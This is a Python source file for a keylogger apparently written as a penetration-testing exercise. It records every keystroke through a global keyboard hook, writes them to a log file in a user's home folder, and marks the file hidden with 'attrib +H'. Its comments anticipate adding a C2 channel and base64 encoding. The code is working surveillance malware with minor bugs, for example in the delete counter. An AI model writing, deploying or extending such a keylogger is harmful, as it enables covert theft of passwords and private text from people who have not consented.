import keyboard
import subprocess
import base64 # added for encryption later on, not yet utilized.

# variables.
log = "C:/Users/fadis/.log.txt"

data = []
backspace_count = 0
delete_count = 0

# key listener function.
def on_key_press(event):
        global data, backspace_count, delete_count

        # backspace and delete counters: these record how many times backspace or delete is presesd in a row.
        if event.name == "backspace":
            backspace_count += 1

        elif event.name == "delete":
            delete_count += 1
        
        # if another key is pressed, this formats and appends the counter to the data list, which makes them get written to the log right away.
        # if a key other than delete is pressed, this appends said key to the data list, and later on to the log file.
        else:
            if backspace_count > 0:
                data.append("\nBackSpace {}x\n".format(backspace_count))
                backspace_count = 0
            elif delete_count > 0:
                data.append("\nDelete {}x\n".format(backspace_count))
                delete_count = 0
            else:
                data.append(event.name)

# Creating - or opening - the log file, and writing keystrokes as soon as they get appended to the data list.
try:
    with open(log, "a") as file:

        # creation and hiding of the log file.
        file.write("[New log file].\n\n")
        subprocess.run(["attrib", "+H", log], check=True)
        print("Log file created and hidden successfully.")

        # setting up the key listener.
        keyboard.on_press(on_key_press)
        
        # stopping condition, this is to be replaced by a C2 protocol in real penetration testing environments.
        while not keyboard.is_pressed("esc"):

            # write collected keystrokes data to the file.
            if data:
                key = data.pop(0)
                if keyboard.is_pressed("enter"):
                    file.write("\n<ENTER>\n")
                elif keyboard.is_pressed("space"):
                    file.write(" <SPACE> ")
                elif keyboard.is_pressed("shift"):
                    file.write(" <SHIFT> ")
                else:
                    file.write(key)
                file.flush() # Ensure data is written to the file immediately.

except PermissionError as e:
    print(f"PermissionError: {e}")
    print("Please check if you have the necessary permissions to write to the file.")